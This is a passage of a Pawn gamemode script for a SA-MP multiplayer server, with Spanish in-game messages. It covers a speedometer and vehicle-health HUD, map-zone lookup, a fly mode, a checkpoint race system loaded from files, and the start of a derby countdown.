					format(lstring,sizeof(lstring),"%sVehiculo: ~w~%s~n~%sVida: ~w~~r~%.2f~n~%sAltitud: ~w~%.1f~n~%sGps: ~w~%s",CategoriesColor,VehicleName[GetVehicleModel(GetPlayerVehicleID(i))-400],CategoriesColor,L_VehHealth,CategoriesColor,LPosZ,CategoriesColor,LuxZone,CategoriesColor);
					TextDrawSetString(LFunc[i], lstring);
				}
				if(GetPlayerSpeed(i,true) >= VehicleMaxSpeed)
				{
					format(lstr,sizeof(lstr),"~r~MPH: ~w~%d  ~r~KM/H: ~r~%d",GetPlayerSpeed(i,false),GetPlayerSpeed(i,true));
					TextDrawSetString(Lmph[i], lstr);
				}
			} else {
				TextDrawHideForPlayer(i, LBox[i]);
				TextDrawHideForPlayer(i, LLine1[i]);
				TextDrawHideForPlayer(i, LLine2[i]);
				TextDrawHideForPlayer(i, LLine3[i]);
				TextDrawHideForPlayer(i, LLine4[i]);
				TextDrawHideForPlayer(i, LCredits[i]);
				TextDrawHideForPlayer(i, Lmph[i]);
				TextDrawHideForPlayer(i, LFunc[i]);
				LuX_SpeedoMeter[i] = 0;
			}
			LuX_ReadPlayerPosition[i][ReadX] = LPosX, LuX_ReadPlayerPosition[i][ReadY] = LPosY, LuX_ReadPlayerPosition[i][ReadZ] = LPosZ;
		}
	}
	return 1;
}

stock dashboardon(playerid)
{
	speedo[playerid] = 1;
	SendClientMessage(playerid,red,"[INFO]:{FFFFFF} Velocimetro activado.");
	return 1;
}

stock dashboardoff(playerid)
{
	speedo[playerid] = 0;
	SendClientMessage(playerid,red,"[INFO]:{FFFFFF} Velocimetro desactivado.");
	return 1;
}

//=================================Lux Speedo===================================
stock LuX_DistanceToPoint(vehicleid)
{
	new Float:LPlayerX, Float:LPlayerY, Float:LPlayerZ, Float:LReadPos;
	GetVehiclePos(vehicleid, LPlayerX, LPlayerY, LPlayerZ);
	LReadPos = floatsqroot(floatpower(floatabs(floatsub(LPlayerX, VehPosX[vehicleid])), 2)+floatpower(floatabs(floatsub(LPlayerY, VehPosY[vehicleid])), 2)+floatpower(floatabs(floatsub(LPlayerZ, VehPosZ[vehicleid])), 2));
	return floatround(LReadPos);
}

stock LuX_ReadPosition(vehicleid)
{
	new Float:LReadX, Float:LReadY, Float:LReadZ;
	GetVehiclePos(vehicleid, LReadX, LReadY, LReadZ);
	VehPosX[vehicleid]=LReadX; VehPosY[vehicleid]=LReadY; VehPosZ[vehicleid]=LReadZ;
}

stock PlayerZone(playerid, zone[])
{
	new ReadTmpZone[MAX_ZONE_NAME];
	GetPlayer3DZone(playerid, ReadTmpZone, sizeof(ReadTmpZone)); for(new i = 0; i != sizeof(SanAndreasZones); i++){
		if(strfind(ReadTmpZone, zone, true) != -1)
			return 1;
	}
	return 0;
}


stock GetPlayer2DZone(playerid, zone[], len)
{
	new Float:x, Float:y, Float:z;
	GetPlayerPos(playerid, x, y, z);
	for(new i = 0; i != sizeof(SanAndreasZones); i++ ){
		if(x >= SanAndreasZones[i][Zone_Area][0] && x <= SanAndreasZones[i][Zone_Area][3] && y >= SanAndreasZones[i][Zone_Area][1] && y <= SanAndreasZones[i][Zone_Area][4]){
		return format(zone, len, SanAndreasZones[i][Zone_Name], 0);}
	}
	return 0;
}
stock GetPlayer3DZone(playerid, zone[], len)
{
	new Float:x, Float:y, Float:z;
	GetPlayerPos(playerid, x, y, z);
	for(new i = 0; i != sizeof(SanAndreasZones); i++ ){
		if(x >= SanAndreasZones[i][Zone_Area][0] && x <= SanAndreasZones[i][Zone_Area][3] && y >= SanAndreasZones[i][Zone_Area][1] && y <= SanAndreasZones[i][Zone_Area][4] && z >= SanAndreasZones[i][Zone_Area][2] && z <= SanAndreasZones[i][Zone_Area][5]){return format(zone, len, SanAndreasZones[i][Zone_Name], 0);
		}
	}
	return 0;
}


///VIDA VEHICULO
public VHPBarUpdate()
{
	for(new i=0; i<GetMaxPlayers(); i++){
		TextDrawHideForPlayer(i,vehiclehpbar[0]);
		TextDrawHideForPlayer(i,vehiclehpbar[1]);
		TextDrawHideForPlayer(i,vehiclehpbar[2]);
		TextDrawHideForPlayer(i,vehiclehpbar[3]);
		TextDrawHideForPlayer(i,vehiclehpbar[4]);
		TextDrawHideForPlayer(i,vehiclehpbar[5]);
		TextDrawHideForPlayer(i,vehiclehpbar[6]);
		TextDrawHideForPlayer(i,vehiclehpbar[7]);
		TextDrawHideForPlayer(i,vehiclehpbar[8]);
		TextDrawHideForPlayer(i,vehiclehpbar[9]);
		TextDrawHideForPlayer(i,vehiclehpbar[10]);
		TextDrawHideForPlayer(i,vehiclehpbar[11]);
		TextDrawHideForPlayer(i,vehiclehpbar[12]);
		if(IsPlayerInAnyVehicle(i) == 1 && PlayerInfo[i][vhpb] == 1){
			new vehicleid;
			vehicleid = GetPlayerVehicleID(i);
			new Float:vhp;
			GetVehicleHealth(vehicleid,vhp);
			if(vhp >= 0.0 && vhp < 250.0){TextDrawShowForPlayer(i,vehiclehpbar[0]);}
			else if(vhp >= 250.0 && vhp < 317.0){TextDrawShowForPlayer(i,vehiclehpbar[1]);}
			else if(vhp >= 317.0 && vhp < 385.0){TextDrawShowForPlayer(i,vehiclehpbar[2]);}
			else if(vhp >= 385.0 && vhp < 453.0){TextDrawShowForPlayer(i,vehiclehpbar[3]);}
			else if(vhp >= 453.0 && vhp < 521.0){TextDrawShowForPlayer(i,vehiclehpbar[4]);}
			else if(vhp >= 521.0 && vhp < 589.0){TextDrawShowForPlayer(i,vehiclehpbar[5]);}
			else if(vhp >= 589.0 && vhp < 657.0){TextDrawShowForPlayer(i,vehiclehpbar[6]);}
			else if(vhp >= 657.0 && vhp < 725.0){TextDrawShowForPlayer(i,vehiclehpbar[7]);}
			else if(vhp >= 725.0 && vhp < 793.0){TextDrawShowForPlayer(i,vehiclehpbar[8]);}
			else if(vhp >= 793.0 && vhp < 861.0){TextDrawShowForPlayer(i,vehiclehpbar[9]);}
			else if(vhp >= 861.0 && vhp < 929.0){TextDrawShowForPlayer(i,vehiclehpbar[10]);}
			else if(vhp >= 929.0 && vhp < 1001.0){TextDrawShowForPlayer(i,vehiclehpbar[11]);}
			else if(vhp >= 1001.0 && vhp <= 1000000.0){TextDrawShowForPlayer(i,vehiclehpbar[12]);}
			else {SendClientMessage(i,red,"[INFO]:{FFFFFF} La barra de salud del vehículo ha fallado temporalmente...");}
		}
	}
	return 1;
}

///////////////////////////////////////////////////////////////////////////////////////////////////
///////////////////////////////////////   Stock IsABike   /////////////////////////////////////////
///////////////////////////////////////////////////////////////////////////////////////////////////
stock IsABike(vehicleid)
	{
		new result;
		new modelo = GetVehicleModel(vehicleid);
		switch(modelo)
	 	{
	 		case 509, 481, 510, 462, 448, 581, 522, 461, 521, 523, 586, 468, 471: result = modelo;
	 		default: result = 0;
	 	}
	 	return result;
	}
//============================== GHOSTRIDER ================================================
stock GhostRiderDesactivar(playerid){
	DestroyObject(GhostRiderObjects[playerid][0]);
	DestroyObject(GhostRiderObjects[playerid][1]);
	DestroyObject(GhostRiderObjects[playerid][2]);
}

stock GhostRiderActivar(playerid, vehicleid){
	GhostRiderObjects[playerid][0]=CreateObject(18689, 0.0, 0.0, 0.0, 0.0, 0.0, 256.0);
	GhostRiderObjects[playerid][1]=CreateObject(18689, 0.0, 0.0, 0.0, 0.0, 0.0, 256.0);
	GhostRiderObjects[playerid][2]=CreateObject(18693, 0.0, 0.0, 0.0, 0.0, 0.0, 256.0);
	AttachObjectToVehicle(GhostRiderObjects[playerid][0], vehicleid, 0.0, 0.6, -1.7, 0.0, 0.0, 0.0);
	AttachObjectToVehicle(GhostRiderObjects[playerid][1], vehicleid, 0.0, -1.4, -1.7, 0.0, 0.0, 0.0);
	AttachObjectToPlayer(GhostRiderObjects[playerid][2], playerid, 0.0, -0.01, -0.9, 0.0, 0.0, 0.0);
	GetVehicleColor(vehicleid, ColorBeforeTransformation[playerid][0], ColorBeforeTransformation[playerid][1]);
	SkinBeforTransformation[playerid]=GetPlayerSkin(playerid);
	ChangeVehicleColor(vehicleid, 0, 0);
}

stock GetVehicleColor(vehicleID, &color1, &color2)
{
	vehicleID = PROPERTY_OFFSET(vehicleID);
	
	if(existproperty(_, "", vehicleID))
	{
		new
			colorStr[24],
			strPos
		;
		getproperty(_, "", vehicleID, colorStr);
		strunpack(colorStr, colorStr);
		
		if((strPos = strfind(colorStr, "-")) != -1)
		{
			color1 = strval(colorStr);
			color2 = strval(colorStr[strPos + 1]);
			return 1;
		}
	}
	return 0;
}

//==============================================================================
GetXYInFrontOfPlayer(playerid, &Float:x, &Float:y, Float:distance)
{
	new Float:a;
	GetPlayerPos(playerid, x, y, a);
	GetPlayerFacingAngle(playerid, a);

	if (GetPlayerVehicleID(playerid)) {
	    GetVehicleZAngle(GetPlayerVehicleID(playerid), a);
	}
	x += (distance * floatsin(-a, degrees));
	y += (distance * floatcos(-a, degrees));
}
InitFly(playerid)
{
	OnFly[playerid] = false;
	return;
}

bool:StartFly(playerid)
{
	if(OnFly[playerid])
    return false;
    OnFly[playerid] = true;
	new Float:x,Float:y,Float:z;
	GetPlayerPos(playerid,x,y,z);
	SetPlayerPos(playerid,x,y,z+5.0);
	ApplyAnimation(playerid,"PARACHUTE","PARA_steerR",6.1,1,1,1,1,0,1);
	Fly(playerid);
	GameTextForPlayer(playerid,"~w~Modo de Vuelo~n~~r~Activado~n~~r~Click Izq~w~-Subes~n~~r~Click Derecho~w~-Bajas~n~ ~r~Espacio~w~-Rapido~n~~r~Alt Izq~w~-Lento",10000,3);
	return true;
}


public Fly(playerid) {
	if(!IsPlayerConnected(playerid)) return 1; new k, ud,lr; GetPlayerKeys(playerid,k,ud,lr);
	new Float:v_x,Float:v_y,Float:v_z, Float:x,Float:y,Float:z; if(ud < 0) { GetPlayerCameraFrontVector(playerid,x,y,z); v_x = x+0.1; v_y = y+0.1; }
	if(k & 128) v_z = -0.2; else if(k & KEY_FIRE) v_z = 0.2; if(k & KEY_WALK) { v_x /=5.0; v_y /=5.0; v_z /=5.0; }
	if(k & KEY_SPRINT) { v_x *=4.0; v_y *=4.0; v_z *=4.0; }
	if(v_z == 0.0) v_z = 0.025; SetPlayerVelocity(playerid,v_x,v_y,v_z);
	if(v_x == 0 && v_y == 0) { if(GetPlayerAnimationIndex(playerid) == 959) ApplyAnimation(playerid,"PARACHUTE","PARA_steerR",6.1,1,1,1,1,0,1); } else { GetPlayerCameraFrontVector(playerid,v_x,v_y,v_z); GetPlayerCameraPos(playerid,x,y,z); SetPlayerLookAt(playerid,v_x*500.0+x,v_y*500.0+y); if(GetPlayerAnimationIndex(playerid) != 959) ApplyAnimation(playerid,"PARACHUTE","FALL_SkyDive_Accel",6.1,1,1,1,1,0,1); }
	if(OnFly[playerid]) SetTimerEx("Fly",100,0,"i",playerid); return 1; }
bool:StopFly(playerid) { if(!OnFly[playerid]) return false; new Float:x,Float:y,Float:z; GetPlayerPos(playerid,x,y,z); SetPlayerPos(playerid,x,y,z); OnFly[playerid] = false; return true; }
static SetPlayerLookAt(playerid,Float:x,Float:y) { new Float:Px, Float:Py, Float: Pa; GetPlayerPos(playerid, Px, Py, Pa); Pa = floatabs(atan((y-Py)/(x-Px))); if (x <= Px && y >= Py) 		Pa = floatsub(180.0, Pa); else if (x < Px && y < Py) 		Pa = floatadd(Pa, 180.0); else if (x >= Px && y <= Py)	Pa = floatsub(360.0, Pa); Pa = floatsub(Pa, 90.0); if (Pa >= 360.0) Pa = floatsub(Pa, 360.0); SetPlayerFacingAngle(playerid, Pa); return; }

stock IsPlayerInWater(playerid)
{
	new anim = GetPlayerAnimationIndex(playerid);
 	if (((anim >=  1538) && (anim <= 1542)) || (anim == 1544) || (anim == 1250) || (anim == 1062)) return 1;
  	return 0;
}

stock IsPlayerAiming(playerid)
{
	new anim = GetPlayerAnimationIndex(playerid);
	if (((anim >= 1160) && (anim <= 1163)) || (anim == 1167) || (anim == 1365) || (anim == 1643) || (anim == 1453) || (anim == 220)) return 1;
 	return 0;
}
function LoadRaceNames()
{
	new
	    rNameFile[64],
	    string[64]
	;
	format(rNameFile, sizeof(rNameFile), "/rRaceSystem/RaceNames/RaceNames.txt");
	TotalRaces = dini_Int(rNameFile, "TotalRaces");
	Loop(x, TotalRaces)
	{
	    format(string, sizeof(string), "Race_%d", x), strmid(RaceNames[x], dini_Get(rNameFile, string), 0, 20, sizeof(RaceNames));
	    //printf(">> Loaded Races: %s", RaceNames[x]);
	}
	return 1;
}

function LoadRace(playerid, rName[])
{
	new
		rFile[256],
		string[256]
	;
	format(rFile, sizeof(rFile), "/rRaceSystem/%s.RRACE", rName);
	if(!dini_Exists(rFile)) return SendClientMessage(playerid, red, "|Race| »{EAEAEA} La carrera no existe."), printf("La carrera \"%s\" no existe!", rName);
	strmid(RaceName, rName, 0, strlen(rName), sizeof(RaceName));
	RaceVehicle = dini_Int(rFile, "vModel");
	RaceType = dini_Int(rFile, "rType");
	TotalCP = dini_Int(rFile, "TotalCP");

	#if DEBUG_RACE == 1
	printf("VehicleModel: %d", RaceVehicle);
	printf("RaceType: %d", RaceType);
	printf("TotalCheckpoints: %d", TotalCP);
	#endif

	Loop(x, 2)
	{
		format(string, sizeof(string), "vPosX_%d", x), RaceVehCoords[x][0] = dini_Float(rFile, string);
		format(string, sizeof(string), "vPosY_%d", x), RaceVehCoords[x][1] = dini_Float(rFile, string);
		format(string, sizeof(string), "vPosZ_%d", x), RaceVehCoords[x][2] = dini_Float(rFile, string);
		format(string, sizeof(string), "vAngle_%d", x), RaceVehCoords[x][3] = dini_Float(rFile, string);
		#if DEBUG_RACE == 1
		printf("VehiclePos %d: %f, %f, %f, %f", x, RaceVehCoords[x][0], RaceVehCoords[x][1], RaceVehCoords[x][2], RaceVehCoords[x][3]);
		#endif
	}
	Loop(x, TotalCP)
	{
 		format(string, sizeof(string), "CP_%d_PosX", x), CPCoords[x][0] = dini_Float(rFile, string);
 		format(string, sizeof(string), "CP_%d_PosY", x), CPCoords[x][1] = dini_Float(rFile, string);
 		format(string, sizeof(string), "CP_%d_PosZ", x), CPCoords[x][2] = dini_Float(rFile, string);
 		#if DEBUG_RACE == 1
 		printf("RaceCheckPoint %d: %f, %f, %f", x, CPCoords[x][0], CPCoords[x][1], CPCoords[x][2]);
 		#endif
	}
	Position = 0;
	FinishCount = 0;
	JoinCount = 0;
	Loop(x, 2) PlayersCount[x] = 0;
	Joined[playerid] = true;
	Race[InRace]++;
	BloquearComandosInRace[playerid] = 1;
	TextDrawHideForPlayer(playerid, TComandos);
 	TextDrawShowForPlayer(playerid, TRace);
	TextDrawShowForPlayer(playerid, TRaceTiempoRestante);
	TextDrawShowForPlayer(playerid, TRaceJugadores);
	TextDrawShowForPlayer(playerid, TCheckpoint);
	SetPVarInt(playerid, "JoinedToRRAce", true);
	CountAmount = COUNT_DOWN_TILL_RACE_START;
	RaceTime = MAX_RACE_TIME;
	RaceBusy = 0x01;
	TimeProgress = 0;
	SetupRaceForPlayer(playerid);
	CountTimer = SetTimer("CountTillRace", 900, 1);
	CallRemoteFunction("OnRaceStart", "");
	return 1;
}


function LoadAutoRace(rName[])
{
    LoadRaceNames();
	new
		rFile[256],
		string[256]
	;
	format(rFile, sizeof(rFile), "/rRaceSystem/%s.RRACE", rName);
	if(!dini_Exists(rFile)) return printf("Race \"%s\" doesn't exist!", rName);
	strmid(RaceName, rName, 0, strlen(rName), sizeof(RaceName));
	RaceVehicle = dini_Int(rFile, "vModel");
	RaceType = dini_Int(rFile, "rType");
	TotalCP = dini_Int(rFile, "TotalCP");

	#if DEBUG_RACE == 1
	printf("VehicleModel: %d", RaceVehicle);
	printf("RaceType: %d", RaceType);
	printf("TotalCheckpoints: %d", TotalCP);
	#endif

	Loop(x, 2)
	{
		format(string, sizeof(string), "vPosX_%d", x), RaceVehCoords[x][0] = dini_Float(rFile, string);
		format(string, sizeof(string), "vPosY_%d", x), RaceVehCoords[x][1] = dini_Float(rFile, string);
		format(string, sizeof(string), "vPosZ_%d", x), RaceVehCoords[x][2] = dini_Float(rFile, string);
		format(string, sizeof(string), "vAngle_%d", x), RaceVehCoords[x][3] = dini_Float(rFile, string);
		#if DEBUG_RACE == 1
		printf("VehiclePos %d: %f, %f, %f, %f", x, RaceVehCoords[x][0], RaceVehCoords[x][1], RaceVehCoords[x][2], RaceVehCoords[x][3]);
		#endif
	}
	Loop(x, TotalCP)
	{
 		format(string, sizeof(string), "CP_%d_PosX", x), CPCoords[x][0] = dini_Float(rFile, string);
 		format(string, sizeof(string), "CP_%d_PosY", x), CPCoords[x][1] = dini_Float(rFile, string);
 		format(string, sizeof(string), "CP_%d_PosZ", x), CPCoords[x][2] = dini_Float(rFile, string);
 		#if DEBUG_RACE == 1
 		printf("RaceCheckPoint %d: %f, %f, %f", x, CPCoords[x][0], CPCoords[x][1], CPCoords[x][2]);
 		#endif
	}
	Position = 0;
	FinishCount = 0;
	JoinCount = 0;
	Loop(x, 2) PlayersCount[x] = 0;
	CountAmount = COUNT_DOWN_TILL_RACE_START;
	RaceTime = MAX_RACE_TIME;
	RaceBusy = 0x01;
	CountTimer = SetTimer("CountTillRace", 900, 1);
	TimeProgress = 0;
	CallRemoteFunction("OnRaceStart", "");
	return 1;
}

function SetCP(playerid, PrevCP, NextCP, MaxCP, Type)
{
	if(Type == 0)
	{
		if(NextCP == MaxCP) SetPlayerRaceCheckpoint(playerid, 1, CPCoords[PrevCP][0], CPCoords[PrevCP][1], CPCoords[PrevCP][2], CPCoords[NextCP][0], CPCoords[NextCP][1], CPCoords[NextCP][2], RACE_CHECKPOINT_SIZE);
			else SetPlayerRaceCheckpoint(playerid, 0, CPCoords[PrevCP][0], CPCoords[PrevCP][1], CPCoords[PrevCP][2], CPCoords[NextCP][0], CPCoords[NextCP][1], CPCoords[NextCP][2], RACE_CHECKPOINT_SIZE);
	}
	else if(Type == 3)
	{
		if(NextCP == MaxCP) SetPlayerRaceCheckpoint(playerid, 4, CPCoords[PrevCP][0], CPCoords[PrevCP][1], CPCoords[PrevCP][2], CPCoords[NextCP][0], CPCoords[NextCP][1], CPCoords[NextCP][2], RACE_CHECKPOINT_SIZE);
			else SetPlayerRaceCheckpoint(playerid, 3, CPCoords[PrevCP][0], CPCoords[PrevCP][1], CPCoords[PrevCP][2], CPCoords[NextCP][0], CPCoords[NextCP][1], CPCoords[NextCP][2], RACE_CHECKPOINT_SIZE);
	}
	return 1;
}

function SetupRaceForPlayer(playerid)
{
	CPProgess[playerid] = 0;
	TogglePlayerControllable(playerid, false);
	CPCoords[playerid][3] = 0;
	SetCP(playerid, CPProgess[playerid], CPProgess[playerid]+1, TotalCP, RaceType);
	if(IsOdd(playerid)) Index2 = 1;
	    else Index2 = 0;

	switch(Index2)
	{
		case 0:
		{
		    if(PlayersCount[0] == 1)
		    {
				RaceVehCoords[0][0] -= (6 * floatsin(-RaceVehCoords[0][3], degrees));
		 		RaceVehCoords[0][1] -= (6 * floatcos(-RaceVehCoords[0][3], degrees));
		   		CreatedRaceVeh[playerid] = CreateVehicle(RaceVehicle, RaceVehCoords[0][0], RaceVehCoords[0][1], RaceVehCoords[0][2]+2, RaceVehCoords[0][3], random(126), random(126), (60 * 60));
				SetPlayerPos(playerid, RaceVehCoords[0][0], RaceVehCoords[0][1], RaceVehCoords[0][2]+2);
				SetPlayerFacingAngle(playerid, RaceVehCoords[0][3]);
				VehicleInfo[CreatedRaceVeh[playerid]][Temp] = 1;
				PutPlayerInVehicle(playerid, CreatedRaceVeh[playerid], 0);
				Camera(playerid, RaceVehCoords[0][0], RaceVehCoords[0][1], RaceVehCoords[0][2], RaceVehCoords[0][3], 20);
			}
		}
		case 1:
 		{
 		    if(PlayersCount[1] == 1)
 		    {
				RaceVehCoords[1][0] -= (6 * floatsin(-RaceVehCoords[1][3], degrees));
		 		RaceVehCoords[1][1] -= (6 * floatcos(-RaceVehCoords[1][3], degrees));
		   		CreatedRaceVeh[playerid] = CreateVehicle(RaceVehicle, RaceVehCoords[1][0], RaceVehCoords[1][1], RaceVehCoords[1][2]+2, RaceVehCoords[1][3], random(126), random(126), (60 * 60));
				SetPlayerPos(playerid, RaceVehCoords[1][0], RaceVehCoords[1][1], RaceVehCoords[1][2]+2);
				SetPlayerFacingAngle(playerid, RaceVehCoords[1][3]);
				VehicleInfo[CreatedRaceVeh[playerid]][Temp] = 1;
				PutPlayerInVehicle(playerid, CreatedRaceVeh[playerid], 0);
				Camera(playerid, RaceVehCoords[1][0], RaceVehCoords[1][1], RaceVehCoords[1][2], RaceVehCoords[1][3], 20);
    		}
 		}
	}
	switch(Index2)
	{
	    case 0:
		{
			if(PlayersCount[0] != 1)
			{
		   		CreatedRaceVeh[playerid] = CreateVehicle(RaceVehicle, RaceVehCoords[0][0], RaceVehCoords[0][1], RaceVehCoords[0][2]+2, RaceVehCoords[0][3], random(126), random(126), (60 * 60));
				SetPlayerPos(playerid, RaceVehCoords[0][0], RaceVehCoords[0][1], RaceVehCoords[0][2]+2);
				SetPlayerFacingAngle(playerid, RaceVehCoords[0][3]);
				VehicleInfo[CreatedRaceVeh[playerid]][Temp] = 1;
				PutPlayerInVehicle(playerid, CreatedRaceVeh[playerid], 0);
				Camera(playerid, RaceVehCoords[0][0], RaceVehCoords[0][1], RaceVehCoords[0][2], RaceVehCoords[0][3], 20);
			    PlayersCount[0] = 1;
		    }
	    }
	    case 1:
	    {
			if(PlayersCount[1] != 1)
			{
		   		CreatedRaceVeh[playerid] = CreateVehicle(RaceVehicle, RaceVehCoords[1][0], RaceVehCoords[1][1], RaceVehCoords[1][2]+2, RaceVehCoords[1][3], random(126), random(126), (60 * 60));
				SetPlayerPos(playerid, RaceVehCoords[1][0], RaceVehCoords[1][1], RaceVehCoords[1][2]+2);
				SetPlayerFacingAngle(playerid, RaceVehCoords[1][3]);
				VehicleInfo[CreatedRaceVeh[playerid]][Temp] = 1;
				PutPlayerInVehicle(playerid, CreatedRaceVeh[playerid], 0);
				Camera(playerid, RaceVehCoords[1][0], RaceVehCoords[1][1], RaceVehCoords[1][2], RaceVehCoords[1][3], 20);
				PlayersCount[1] = 1;
		    }
   		}
	}
    /*new
	    string[128]
	;*/
	#if defined RACE_IN_OTHER_WORLD
	SetPlayerVirtualWorld(playerid, 10);
	#endif
	InfoTimer[playerid] = SetTimerEx("TextInfo", 500, 1, "e", playerid);
	new
	    string[128]
	;
	format(string,sizeof(string),"%d", Race[InRace]);
	TextDrawSetString(TRaceJugadores2[playerid], string);
	format(string,sizeof(string),"%s", TimeConvert(RaceTime));
	TextDrawSetString(TRaceTiempoRestante2[playerid], string);
	format(string,sizeof(string),"%d/%d", CPProgess[playerid], TotalCP);
	TextDrawSetString(TCheckpoint2[playerid], string);
    TextDrawShowForPlayer(playerid, TRaceTiempoRestante2[playerid]);
	TextDrawShowForPlayer(playerid, TRaceJugadores2[playerid]);
	TextDrawShowForPlayer(playerid, TCheckpoint2[playerid]);
	JoinCount++;
	return 1;
}

function CountTillRace()
{
    /*for(new i=0;i!=MAX_PLAYERS;i++){
    TextDrawShowForPlayer(i, Carrera);
    }*/
	switch(CountAmount)
	{
 		case 0:
	    {
			ForEach(i, MAX_PLAYERS)
			{
			    if(Joined[i] == false)
			    {
			        //new string[128];
					//format(string, sizeof(string), "{FF0000}[CARRERA]:{FFFFFF} Ya no te puedes unir a la carrera {00FF00}%s{FFFFFF}. El tiempo terminó!", RaceName);
					//SendClientMessage(i, RED, string);
				}
			}
			Empezar();
	    }
	    case 1..9:
	    {
	        new
	            string[10]
			;
			format(string, sizeof(string), "~w~%d", CountAmount);
			ForEach(i, MAX_PLAYERS)
			{
			    if(Joined[i] == true)
			    {
			    	GameTextForPlayer(i, string, 999, 5);
			    }
			}
	    }
	    case 30:
	    {
	        new string[145];
	        //TextDrawTimer = SetTimer("ActualizarTextDraw", 1000, 1);
	        format(string, sizeof(string), "|Race| »{EAEAEA} En %d segundos empezara la carrera {919770}#%s,{EAEAEA} utiliza {A9A9A9}/carrera{EAEAEA}", CountAmount, RaceName);
			SendClientMessageToAll(red, string);
	    }
	}
	return CountAmount--;
}

function Empezar()
{
    /*KillTimer(TextDrawTimer);
    for(new i=0;i!=MAX_PLAYERS;i++){
    TextDrawHideForPlayer(i, Carrera);
	}*/
	ForEach(i, MAX_PLAYERS)
	{
	    if(Joined[i] == true)
	    {
	        TogglePlayerControllable(i, true);
	        PlayerPlaySound(i, 1057, 0.0, 0.0, 0.0);
	        CallRemoteFunction("OnRaceEnd", "");
  			GameTextForPlayer(i, "~w~GO GO GO!", 2000, 5);
			SetCameraBehindPlayer(i);
            TogglePlayerControllable(i, 1);
            SetVehicleHealth(GetPlayerVehicleID(i), 1000000.0);
            AddVehicleComponent(GetPlayerVehicleID(i), 1010);
	    }
	}
	rCounter = SetTimer("RaceCounter", 900, 1);
	RaceTick = GetTickCount();
	RaceStarted = 1;
	KillTimer(CountTimer);
	return 1;
}

function StopRace()
{
    /*KillTimer(TextDrawTimer);
    for(new i=0;i!=MAX_PLAYERS;i++){
    TextDrawHideForPlayer(i, Carrera);
	}*/
    for(new i=0;i!=MAX_PLAYERS;i++){
    BloquearComandosInRace[i] = 0;
    }
	KillTimer(rCounter);
	RaceStarted = 0;
	RaceTick = 0;
	RaceBusy = 0x00;
	CallRemoteFunction("OnRaceEnd", "");
	JoinCount = 0;
	FinishCount = 0;
    TimeProgress = 0;
    //Carreras = SetTimer("ACarreras",1200000,0);
	ForEach(i, MAX_PLAYERS)
	{
	    if(Joined[i] == true)
	    {
	    	DisablePlayerRaceCheckpoint(i);
	    	DestroyVehicle(CreatedRaceVeh[i]);
	    	Joined[i] = false;
    	    Race[InRace] = 0;
	    	SetPVarInt(i, "JoinedToRRAce", false);
			CPProgess[i] = 0;
			KillTimer(InfoTimer[i]);
			TextDrawHideForPlayer(i, TRace);
    		TextDrawHideForPlayer(i, TRaceTiempoRestante);
    		TextDrawHideForPlayer(i, TRaceJugadores);
    		TextDrawHideForPlayer(i, TCheckpoint);
    		TextDrawHideForPlayer(i, TRaceTiempoRestante2[i]);
			TextDrawHideForPlayer(i, TRaceJugadores2[i]);
			TextDrawHideForPlayer(i, TCheckpoint2[i]);
			TextDrawShowForPlayer(i, TComandos);
			PlayerInfo[i][DoorsLocked] = 0;
		}
	}
	SendClientMessageToAll(red, "|Race| »{EAEAEA} La carrera ha terminado.");
	if(AutomaticRace == true) LoadRaceNames(), LoadAutoRace(RaceNames[random(TotalRaces)]);
	return 1;
}

function RaceCounter()
{
	if(RaceStarted == 1)
	{
		RaceTime--;
		if(JoinCount <= 0)
		{
			StopRace();
			//SendClientMessageToAll(RED, "{FF0000}|Race| »{FFFFFF} La carrera finalizó.. No hay nadie en la carrera. Empezara otra en 15 minutos");
		}
	}
	if(RaceTime <= 0)
	{
	    StopRace();
	}
	return 1;
}

function TextInfo(playerid)
{
	new string[128];
	format(string,sizeof(string),"%d", Race[InRace]);
	TextDrawSetString(TRaceJugadores2[playerid], string);
	format(string,sizeof(string),"%s", TimeConvert(RaceTime));
	TextDrawSetString(TRaceTiempoRestante2[playerid], string);
	format(string,sizeof(string),"%d/%d", CPProgess[playerid], TotalCP);
	TextDrawSetString(TCheckpoint2[playerid], string);
	//format(string,sizeof(string),"%d/%d", RacePosition[playerid], JoinCount);
	//TextDrawSetString(TPosicion2[playerid], string);
    TextDrawShowForPlayer(playerid, TRaceTiempoRestante2[playerid]);
	TextDrawShowForPlayer(playerid, TRaceJugadores2[playerid]);
	TextDrawShowForPlayer(playerid, TCheckpoint2[playerid]);
}

function Camera(playerid, Float:X, Float:Y, Float:Z, Float:A, Mul)
{
	SetPlayerCameraLookAt(playerid, X, Y, Z);
	SetPlayerCameraPos(playerid, X + (Mul * floatsin(-A, degrees)), Y + (Mul * floatcos(-A, degrees)), Z+6);
}

function IsPlayerInRace(playerid)
{
	if(Joined[playerid] == true) return true;
	    else return false;
}

/*stock IsValidVehicle(vehicleid)
{
	if(vehicleid < 400 || vehicleid > 611) return false;
	    else return true;
}*/

TimeConvert(seconds)
{
	new tmp[16];
 	new minutes = floatround(seconds/60);
  	seconds -= minutes*60;
   	format(tmp, sizeof(tmp), "%d:%02d", minutes, seconds);
   	return tmp;
}

stock IsWeaponWithbala(weaponid)
{
	switch(weaponid)
	{

		case 16..18, 22..39, 41..42: return 1;
		default: return 0;
	}
	return 0;

}

stock GetPlayerWeaponbala(playerid,weaponid)
{
	new wd[2][13];
	for(new i; i<13; i++) GetPlayerWeaponData(playerid,i,wd[0][i],wd[1][i]);
	for(new i; i<13; i++)
	{

		if(weaponid == wd[0][i]) return wd[1][i];
	}
	return 0;
}

//=============================== SISTEMA DE DERBY =============================
public DerbyCountdown()
{
	if(DI[STATUS] != DERBY_WAIT) return KillTimer(DI[COUNTDOWN_TIMER]);

	if(DI[PLAYERSD] <= 0) return CloseDerby();
	if(DI[PLAYERSD] == 1)
	{
		DI[COUNTDOWN_COUNTER] = DERBY_TIME_COUNTDOWN + 1;
		DI[TEXTDRAW_ANIMATION] ++;
		if(DI[TEXTDRAW_ANIMATION] >= sizeof WaitTextDrawAnimation) DI[TEXTDRAW_ANIMATION] = 0;
		TextDrawSetString(TD_DERBY_Message, WaitTextDrawAnimation[ DI[TEXTDRAW_ANIMATION] ]);
		return 1;
	}

	DI[COUNTDOWN_COUNTER] --;

	new str[145]; format(str, 145, "%d/%d_~g~~h~jugadores~n~~y~faltan_~w~%d_~y~segundos_para_empezar", DI[PLAYERSD], MAX_DERBY_PLAYERS, DI[COUNTDOWN_COUNTER]);
	if(DI[COUNTDOWN_COUNTER] != 0) TextDrawSetString(TD_DERBY_Message, str);

	if(DI[COUNTDOWN_COUNTER] <= 0)
	{
		KillTimer(DI[COUNTDOWN_TIMER]);
